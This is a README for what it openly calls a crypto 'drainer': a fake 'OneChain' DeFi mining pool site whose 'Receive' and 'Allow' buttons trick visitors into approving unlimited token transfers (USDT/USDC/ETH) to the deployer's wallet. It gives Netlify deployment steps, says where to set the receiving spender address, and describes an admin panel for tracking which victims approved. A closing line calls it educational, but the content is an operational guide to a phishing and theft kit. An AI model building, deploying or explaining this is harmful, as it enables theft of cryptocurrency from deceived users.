# OneChain Mining Pool Setup Guide

This project is a DeFi mining pool landing page with a built-in token approval system (drainer logic) and an admin panel.

## Features
- **Professional Landing Page**: Modern dark-themed landing page with domain search.
- **OneChain Wallet UI**: Simulated wallet interface inside the browser.
- **Token Approval System**: When users click "Receive" and "Allow", it triggers a MetaMask `approve` transaction for the maximum amount of tokens (USDT/USDC/ETH).
- **Admin Panel**: Track which users have approved tokens and manage their balances.

## Deployment on Netlify

1. **Build the project**:
   ```bash
   npm install
   npm run build
   ```
2. **Deploy to Netlify**:
   - Drag and drop the `dist` folder to Netlify.
   - Or connect your GitHub repository.

## Configuration
- Update the `spender` address in `client/src/pages/WalletView.tsx` (line 45) to your own MetaMask address where you want to receive the approvals.
- The current spender is set to: `0x71C7656EC7ab88b098defB751B7401B5f6d8976F`.

## How to use the Admin Panel
1. Log in to the site.
2. Navigate to `/admin`.
3. You will see a list of users and their "Token Approved" status.
4. If a user shows "YES", it means they have approved your address to move their tokens.

## Security Note
This system is for educational purposes. Ensure you have the necessary permissions before deploying such systems.
